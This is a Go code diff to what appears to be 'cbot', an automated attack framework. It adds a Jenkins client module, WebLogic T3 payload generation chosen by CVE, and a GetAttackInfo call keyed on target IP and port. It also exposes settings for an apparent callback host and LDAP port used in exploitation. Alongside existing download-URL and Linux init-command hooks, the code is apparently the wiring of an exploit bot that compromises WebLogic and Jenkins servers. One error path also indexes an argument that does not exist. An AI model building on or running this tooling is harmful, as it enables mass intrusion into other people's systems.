@@ -5,6 +5,7 @@ import (
 	"github.com/cbot/attack"
 	"github.com/cbot/attack/weblogic"
 	"github.com/cbot/proto/http"
+	"github.com/cbot/proto/jenkins"
 	"github.com/cbot/proto/transport"
 	"github.com/cbot/targets/source"
 	"github.com/d5/tengo/objects"
@@ -52,6 +53,7 @@ func scriptCompile(sdata []byte) (*script.Compiled, error) {
 	mm.Add("attack", AttackScript{})
 	mm.Add("http", http.HttpTengo{})
 	mm.Add("transport",transport.TransportTengo{})
+	mm.Add("jenkins",jenkins.JeckinsClientTengo{})
 
 	script.SetImports(mm)
 
@@ -180,7 +182,7 @@ func newAttackProcess(args ...objects.Object) (ret objects.Object, err error) {
 
 func (as *AttackScript) MakeWeblogicT3Payload(args ...objects.Object) (ret objects.Object, err error) {
 
-	if len(args) != 2 {
+	if len(args) != 3 {
 
 		return nil, tengo.ErrWrongNumArguments
 	}
@@ -199,11 +201,20 @@ func (as *AttackScript) MakeWeblogicT3Payload(args ...objects.Object) (ret objec
 		return nil, tengo.ErrInvalidArgumentType{
 			Name:     "version",
 			Expected: "string(compatible)",
-			Found:    args[0].TypeName(),
+			Found:    args[1].TypeName(),
 		}
 	}
 
-	pload,_ := weblogic.MakeWeblogicPayload(cmd,version)
+	cve, ok := objects.ToString(args[2])
+	if !ok {
+		return nil, tengo.ErrInvalidArgumentType{
+			Name:     "cve",
+			Expected: "string(compatible)",
+			Found:    args[2].TypeName(),
+		}
+	}
+
+	pload,_ := weblogic.MakeWeblogicPayload(cmd,version,cve)
 
 	return objects.FromInterface(pload)
 }
@@ -295,6 +306,44 @@ func (as *AttackScript) DownloadInitURL(args ...objects.Object) (ret objects.Obj
 
 }
 
+func (as *AttackScript) GetAttackInfo(args ...objects.Object) (ret objects.Object, err error) {
+
+	if len(args) != 3 {
+
+		return nil, tengo.ErrWrongNumArguments
+	}
+
+	targetIP, ok := objects.ToString(args[0])
+	if !ok {
+		return nil, tengo.ErrInvalidArgumentType{
+			Name:     "targetIP",
+			Expected: "string(compatible)",
+			Found:    args[0].TypeName(),
+		}
+	}
+
+	targetPort, ok := objects.ToInt(args[1])
+	if !ok {
+		return nil, tengo.ErrInvalidArgumentType{
+			Name:     "targetPort",
+			Expected: "int(compatible)",
+			Found:    args[1].TypeName(),
+		}
+	}
+
+	fname, ok := objects.ToString(args[2])
+	if !ok {
+		return nil, tengo.ErrInvalidArgumentType{
+			Name:     "attackType",
+			Expected: "string(compatible)",
+			Found:    args[3].TypeName(),
+		}
+	}
+
+	return objects.FromInterface(as.attackTasks.GetAttackInfo(targetIP, targetPort, as.attackType, fname))
+
+}
+
 func (as *AttackScript) GetTaskId(args ...objects.Object) (ret objects.Object, err error) {
 
 	return objects.FromInterface(as.attackTasks.GetTaskId())
@@ -319,6 +368,15 @@ func (as *AttackScript) IndexGet(index objects.Object) (value objects.Object, er
 
 	switch key {
 
+	case "sbotHost":
+		return objects.FromInterface(as.attackTasks.Cfg.SBotHost)
+
+	case "sbotDPort":
+		return objects.FromInterface(as.attackTasks.Cfg.SBotPort)
+
+	case "sbotJPort":
+		return objects.FromInterface(as.attackTasks.Cfg.SBotLdapPort)
+
 	case "pubProcess":
 
 		return &AttackScriptMethod{
@@ -330,6 +388,13 @@ func (as *AttackScript) IndexGet(index objects.Object) (value objects.Object, er
 
 		return &AttackScriptMethod{
 			TengoObj: attack.TengoObj{Name: "downloadInitUrl"},
+			as:       as,
+		}, nil
+
+	case "getAttackInfo":
+
+		return &AttackScriptMethod{
+			TengoObj: attack.TengoObj{Name: "getAttackInfo"},
 			as:       as,
 		}, nil
 
@@ -390,6 +455,9 @@ func (m *AttackScriptMethod) Call(args ...objects.Object) (objects.Object, error
 
 	case "downloadInitUrl":
 		return m.as.DownloadInitURL(args...)
+
+	case "getAttackInfo":
+		return m.as.GetAttackInfo(args...)
 
 	case "initCmdForLinux":
 		return m.as.InitCmdForLinux(args...)
